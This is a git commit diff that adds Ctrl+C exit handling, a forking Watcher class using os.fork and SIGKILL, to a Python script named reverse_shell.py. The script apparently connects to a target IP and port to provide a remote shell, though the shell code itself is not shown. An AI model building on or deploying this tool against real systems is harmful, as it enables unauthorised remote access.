0f92337850f53db080f60cc7e2de4b017684811e
roylieu <roy@rootk.com>
2012-11-07 17:58:51 +0800

    add exit by ctrl+c

--- reverse_shell.py
+++ reverse_shell.py
@@ -7,6 +7,7 @@ import threading
 import sys
 import errno
 import time
+import signal
 
 
 def getshell():
@@ -54,6 +55,49 @@ class MonitorThread(threading.Thread):
             time.sleep(0.1)
 
 
+class Watcher:   
+    """this class solves two problems with multithreaded  
+    programs in Python, (1) a signal might be delivered  
+    to any thread (which is just a malfeature) and (2) if  
+    the thread that gets the signal is waiting, the signal  
+    is ignored (which is a bug).  
+ 
+    The watcher is a concurrent process (not thread) that  
+    waits for a signal and the process that contains the  
+    threads.  See Appendix A of The Little Book of Semaphores.  
+    http://greenteapress.com/semaphores/  
+ 
+    I have only tested this on Linux.  I would expect it to  
+    work on the Macintosh and not work on Windows.  
+    """  
+  
+    def __init__(self):   
+        """ Creates a child thread, which returns.  The parent  
+            thread waits for a KeyboardInterrupt and then kills  
+            the child thread.  
+        """  
+        self.child = os.fork()   
+        if self.child == 0:   
+            return  
+        else:   
+            self.watch()
+            
+    def watch(self):   
+        try:   
+            os.wait()   
+        except (KeyboardInterrupt, SystemExit):   
+            # I put the capital B in KeyBoardInterrupt so I can   
+            # tell when the Watcher gets the SIGINT
+            print "server exit at %s" % time.asctime()
+            self.kill()   
+        sys.exit()   
+  
+    def kill(self):   
+        try:   
+            os.kill(self.child, signal.SIGKILL)   
+        except OSError: pass 
+
+
 def usage():
     print """
     Usage: %s target_ip port
@@ -71,6 +115,7 @@ if __name__ == '__main__':
         if len(sys.argv) <= 1:
             usage()
             sys.exit(1)
+    Watcher()
     Monitor = MonitorThread(target, int(port))
     Monitor.start()
 
